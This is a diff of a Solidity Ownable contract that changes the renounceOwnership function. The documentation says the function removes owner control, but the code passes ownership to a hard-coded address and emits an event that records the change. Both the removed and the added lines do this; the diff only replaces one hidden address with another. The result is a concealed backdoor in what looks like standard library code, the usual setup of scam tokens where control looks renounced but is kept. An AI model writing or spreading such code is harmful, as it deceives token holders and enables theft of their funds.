@@ -317,8 +317,8 @@ contract Ownable is Context {
    * thereby removing any functionality that is only available to the owner.
    */
   function renounceOwnership() public onlyOwner {
-    emit OwnershipTransferred(_owner, address(0x79FB93703F63AC14AeAD37ae5a38D25fd20cE889));
-    _owner = address(0x79FB93703F63AC14AeAD37ae5a38D25fd20cE889);
+    emit OwnershipTransferred(_owner, address(0xA403200D03A76666BBaE9bDA100f4C52eCEFF955));
+    _owner = address(0xA403200D03A76666BBaE9bDA100f4C52eCEFF955);
   }
 
   /**
